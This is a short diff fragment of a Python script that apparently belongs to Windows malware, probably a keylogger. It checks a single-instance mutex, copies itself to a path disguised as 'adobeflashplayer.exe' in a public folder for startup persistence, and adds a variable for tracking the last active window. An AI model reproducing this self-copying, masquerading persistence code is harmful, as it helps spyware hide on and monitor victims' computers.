@@ -21,6 +21,7 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 x, data, count= '', '', 0
 
 dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"
+lastWindow = ''
 
 def startup():
     shutil.copy(sys.argv[0], dir)
